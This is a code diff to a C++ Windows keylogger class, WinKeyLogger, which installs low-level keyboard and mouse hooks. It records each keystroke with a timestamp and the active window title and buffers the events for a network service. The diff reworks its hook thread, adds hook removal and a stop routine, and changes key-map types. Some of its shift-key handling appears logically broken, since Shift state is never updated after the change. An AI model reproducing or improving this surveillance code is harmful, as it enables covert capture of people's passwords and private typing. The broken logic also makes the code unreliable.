@@ -23,11 +23,7 @@ namespace spi
     {
     public:
         explicit WinKeyLogger(net::IOManager *service) :
-            _service(service), _circularBuffer(10),
-            _thread{std::move([this]() {
-                this->setupHooks();
-                while (GetMessage(nullptr, nullptr, 0, 0));
-            })}
+            _service(service), _circularBuffer(10)
         {
             _sharedInstance = this;
         }
@@ -36,6 +32,11 @@ namespace spi
 
         bool setup() noexcept override
         {
+            _thread = new std::thread{([this]() {
+                setupHooks();
+                while (_threadLoop && GetMessage(nullptr, nullptr, 0, 0));
+                removeHooks();
+            })};
             return true;
         }
 
@@ -114,7 +115,7 @@ namespace spi
                 return;
             }
 
-            static const std::unordered_map<char, proto::KeyCode> notShifted = {
+            static const std::unordered_map<DWORD, proto::KeyCode> notShifted = {
                 {'A',        proto::KeyCode::a},
                 {'Z',        proto::KeyCode::z},
                 {'E',        proto::KeyCode::e},
@@ -178,7 +179,7 @@ namespace spi
                 {165,        proto::KeyCode::AltGr},
             };
 
-            static const std::unordered_map<char, proto::KeyCode> shifted = {
+            static const std::unordered_map<DWORD, proto::KeyCode> shifted = {
                 {'A',        proto::KeyCode::A},
                 {'Z',        proto::KeyCode::Z},
                 {'E',        proto::KeyCode::E},
@@ -246,10 +247,11 @@ namespace spi
 
             std::string tmp{};
 
-            tmp.reserve(255);
+            tmp.reserve(256);
             HWND hwnd = GetForegroundWindow();
             GetWindowText(hwnd, tmp.data(), sizeof(char) * 256);
             if (tmp != _activeWindowTitle) {
+                std::lock_guard<std::mutex> lock_guard(_bufferMutex);
                 proto::WindowChanged windowChanged;
 
                 windowChanged.windowName = tmp;
@@ -266,16 +268,18 @@ namespace spi
 
                 keyEvent.timestamp = std::chrono::steady_clock::now();
                 if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Up) {
-                    keyEvent.code = shifted.at(code);
+                    if (shifted.find(code) != shifted.end()) {
+                        keyEvent.code = shifted.at(code);
+                    }
                 } else if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Down) {
-                    keyEvent.code = notShifted.at(code);
+                    if (shifted.find(code) != shifted.end()) {
+                        if (shifted.at(code) == proto::KeyCode::Shift) {
+                            keyEvent.code = shifted.at(code);
+                        }
+                    }
                 } else {
                     _log(logging::Warning) << "Unhandled KeyEvent {" << code << "}" << std::endl;
                     return;
-                }
-                if (notShifted.at(code) == proto::KeyCode::Shift) {
-                    _activeKeys[proto::KeyCode::Shift] =
-                        wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;
                 }
 
                 std::lock_guard<std::mutex> lock_guard(_bufferMutex);
@@ -294,6 +298,13 @@ namespace spi
             _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
             _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
             _log(logging::Info) << "[HOOKS] Successfully settled" << std::endl;
+        }
+
+        void removeHooks() noexcept
+        {
+            UnhookWindowsHookEx(_keyboardHook);
+            UnhookWindowsHookEx(_mouseHook);
+            _log(logging::Info) << "[HOOKS] Successfully removed" << std::endl;
         }
 
         void threadFunction() noexcept
@@ -330,7 +341,12 @@ namespace spi
 
         void stop() override
         {
-            _log(logging::Info) << "[HOOKS] Remove" << std::endl;
+            _threadLoop = false;
+            if (_thread->joinable()) {
+                _thread->join();
+            }
+            delete _thread;
+            // KILL THREAD
         }
 
     private:
@@ -342,7 +358,8 @@ namespace spi
         boost::circular_buffer<Events> _circularBuffer;
         std::mutex _bufferMutex;
 
-        std::thread _thread;
+        std::atomic<bool> _threadLoop{true};
+        std::thread *_thread;
 
         std::string _activeWindowTitle{};
         std::unordered_map<proto::KeyCode::EnumType, proto::KeyState> _activeKeys{};
